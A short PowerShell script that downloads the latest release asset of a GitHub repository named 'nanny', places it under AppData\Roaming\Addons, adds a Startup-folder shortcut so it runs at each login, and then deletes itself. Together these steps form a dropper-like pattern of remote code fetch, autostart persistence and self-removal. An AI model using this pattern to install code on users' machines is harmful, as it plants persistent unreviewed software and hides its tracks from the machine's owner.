# Set the working directory to the user's home directory
Set-Location -Path "C:\Users\$env:username\"

# Define the URL for the latest release of the desired file on GitHub
$RepoUrl = "https://api.github.com/repos/DrunkenLyricist/nanny/releases/latest"
# Retrieve information about the latest release
$ReleaseInfo = Invoke-RestMethod -Uri $RepoUrl
# Get the download URL and file name for the first asset (assumes only one asset is available)
$DownloadUrl = $ReleaseInfo.assets[0].browser_download_url
$FileName = $ReleaseInfo.assets[0].name

# Remove the target directories and files if they exist
Remove-Item C:\Users\$env:username\AppData\Roaming\Addons\ -Recurse -ErrorAction Ignore
Remove-Item C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\NeberoLogin.lnk -Recurse -ErrorAction Ignore

# Create the target directory for the downloaded file
New-Item C:\Users\$env:username\AppData\Roaming\Addons\ -ItemType Directory

# Download the file from GitHub and copy it to the target directory
Invoke-WebRequest $DownloadUrl -OutFile $FileName
Copy-Item $FileName C:\Users\$env:username\AppData\Roaming\Addons\

# Create a shortcut to the file in the Windows Startup folder
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\NeberoLogin.lnk")
$Shortcut.TargetPath = "C:\Users\$env:username\AppData\Roaming\Addons\$FileName"
$Shortcut.Save()

# Remove the downloaded file
Remove-Item $FileName

# Clean up the script file
Remove-Item $MyInvocation.MyCommand.Path # uncomment this line if you want the script to delete itself
